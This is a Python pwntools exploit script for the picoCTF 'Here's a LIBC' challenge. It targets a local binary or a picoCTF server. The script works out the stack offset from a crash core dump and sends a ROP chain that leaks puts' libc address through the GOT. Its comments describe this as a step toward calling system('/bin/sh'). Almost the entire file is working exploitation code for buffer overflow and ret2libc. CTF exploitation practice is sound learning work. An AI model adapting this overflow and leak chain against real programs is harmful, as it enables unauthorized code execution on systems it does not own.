#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

NUM_CYCLIC_BYTES = 256

context.binary = exe
context.log_level = 'info'

def find_offset_to_return_address():
    '''This function will generate a cyclic pattern and send it as input to the program. It will get examine the return address of the function `do_stuff` and find where in the cyclic pattern those bytes exist. Returns the number of bytes needed to overwrite the return address.

    https://docs.pwntools.com/en/stable/elf/corefile.html
    '''
    # Generate a cyclic pattern so that we can auto-find the offset.
    payload = cyclic(NUM_CYCLIC_BYTES)

    # Run the process once so that it crashes.
    proc = process([exe.path])

    # Send the payload.
    proc.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!', payload)
    proc.wait()

    # Get the core dump.
    core = proc.corefile

    # The faulting address should be some subset of bytes inside our cyclic pattern.
    # `pwn.pack` will convert the hexadecimal bytes of the address to a string, which is the data structure used for our cyclic pattern.
    assert pack(core.fault_addr) in payload, "Faulting address not in the cyclic pattern."

    # Find our offset.
    offset = cyclic_find(pack(core.fault_addr), n=4)

    return offset

def rop_find_addr_puts(offset, puts_got):
    '''Create a ROP chain that will call `puts` with an argument of the address of `puts` after it has been resolved and updated in the GOT. This will inform us of where `puts` resides in memory. From this, we can calculate where other functions that are loaded from libc are placed in memory. Ultimately, this will be useful to call system('/bin/sh').

    https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Heres_a_LIBC.md
    '''
    rop = ROP(exe)

    # Call `puts` with the address of puts as the argument to the function.
    rop.call('puts', [puts_got])

    # Call do_stuff to go through the loop again without exiting the executable.
    rop.call('do_stuff')

    # Pad our way to the offset where we need to overwrite the return address.
    ropchain = fit({
        offset: rop
    })

    return ropchain


def conn():
    if args.REMOTE:
        r = remote("mercury.picoctf.net", 49464)

    else:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)

    return r


def main():
    r = conn()

    offset = find_offset_to_return_address() # 136
    print(f"[+] The offset to the faulting address is: {offset}.")

    puts_plt = exe.plt['puts'] # PIE is not enabled, so this will not change.
    puts_got = exe.got['puts'] # PIE is not enabled, so this will not change.
    log.info(f"[+] The address of `puts` in the PLT is: {hex(puts_plt)}.")
    log.info(f"[+] The address of `puts` in the GOT is: {hex(puts_got)}.")

    # Get out first ropchain to find the address of `puts` in the GOT after it has been resolved by the dynamic linker.
    ropchain = rop_find_addr_puts(offset, puts_got)

    # Send our first ropchain.
    r.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!', ropchain)
    r.recvline()
    r.recvline()

    # This represents where the address of `puts` is in libc after it has been loaded into memory. Now we can calculate the offset to other things in libc.
    puts_addr = int.from_bytes(r.recvline(), byteorder = "little")
    log.info("puts() runtime address: {}".format(hex(puts_addr)))
    r.interactive()

if __name__ == "__main__":
    main()
